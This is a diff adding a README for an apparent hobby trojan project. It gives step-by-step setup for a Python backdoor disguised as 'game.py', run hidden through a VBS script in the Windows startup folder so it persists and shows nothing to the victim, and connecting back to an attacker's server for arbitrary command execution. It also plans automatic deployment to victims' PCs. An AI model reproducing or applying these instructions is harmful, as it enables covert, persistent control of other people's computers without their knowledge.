@@ -1,0 +1,81 @@
+This is a project in which we can access a PC/Laptop's CMD and can execute instruction on victim's machine. This is for fun you can't do extreme things with this script. 
+
+I IMPROVE THIS PROJECT FROM: https://github.com/Ashii198/Local_Network_Trojan
+ADDING:
+
+- "Attacker's autorun.bat" 
+- "Victim's autorun.bat"
+- "script.vbs" (for execute "game.py" in background, and the Victim will not use the game, all is hide from the Victim's screen)
+
+*** YOU NEED TO MOVE THE FOLDER "Trojan" FROM DOWNLOAD TO DESKTOP ***
+*** DON'T MOVE THE FILES, OR RENAME IT... MOVE ONLY WHERE I WILL TELL YOU ***
+
+(for the Attacker's PC)
+YOU HAVE TO:
+
+1. Install Python (I use Python 3.9.0) --> https://www.python.org/downloads/windows/ (REMEMBER TO SELECT "add Python to PATH")
+
+2. Set the Attacker's IP on "server.py"
+
+3. Set the "YOUR USERNAME" string in your pc username on the following files:
+
+- Attacker's autorun.bat
+
+4. Press WINDOWS + R and write "shell:startup" and move "Attacker's autorun.bat" in
+   (that at the restart, if you want, the server will run automatically)
+
+Run server.py as an attacker and after successfully executing enter "cmdon" to access cmd and "cmdoff" to terminate cmd access.
+
+
+
+
+
+
+(for the Victim's PC)
+YOU HAVE TO DO THIS THINGS ONLY ONE TIME, AND THE TROJAN WILL START AUTOMATICALLY AFTER YOU FOLLOW THIS STEPS:
+
+1. Install Python (I use Python 3.9.0) --> https://www.python.org/downloads/windows/ (REMEMBER TO SELECT "add Python to PATH")
+
+2. Set the Attacker's IP on "game.py"
+
+3. Set the "YOUR USERNAME" space in the following files:
+
+- Victim's autorun.bat
+- script.vbs
+
+4. Press WINDOWS + R and write "shell:startup" or "shell:common stratup" (if you want to apply the autorun to all the users on the PC) and move "script.vbs" in
+   (that at the restart, if you want, the game will run automatically)
+
+
+(NOTE: RUN THE SERVER.PY FILE BEFORE THE GAME.PY)
+
+
+HERE IS IT A SUMMARY:
+
+1. Install Python (for Attacker and Victim)
+2. Download this folder (Trojan) and drag in from Downloads to Desktop (for Attacker and Victim)
+3. Set the IP as an Attacker on "server.py" and "game.py"
+
+4. The Attacker's needed files:
+- Attacker's autorun.bat (on the autorun folder by pressing WINDOWS + R and write "shell:startup", modify the "YOUR USERNAME" place with your username)
+- server.py (let it in the desktop folder "Trojan")
+
+5. The Victim's needed files:
+- Victim's autorun.bat (let it in the desktop folder "Trojan", modify the "YOUR USERNAME" place with your username)
+- game.py (let it in the desktop folder "Trojan")
+- script.vbs  (on the autorun folder by pressing WINDOWS + R and write "shell:startup", modify the "YOUR USERNAME" place with your username)
+
+
+THE PROCESS:
+
+1. The Attacker start the PC (than the "Attacker's autorun" will start the "server.py" automatically)
+2. The Victim start the PC (than the "script" will will start the "game.py" without showing anything at the user, every time the PC will be started)
+3. Use command "cmdon" to have access and use any command you want
+4. Use command "cmdoff"
+
+
+TO ADD:
+
+- A way to tell at the Attacker if the Victim starts the PC, but the server is not started (for exampòe, the "Victim's autorun send and email by CMD and after, shutdown the Victim's PC, then the Attacker will start the server and the Victim will start the PC")
+
+- A way to download the folder (Trojan) on the Victim's PC and move all in the right place automatically
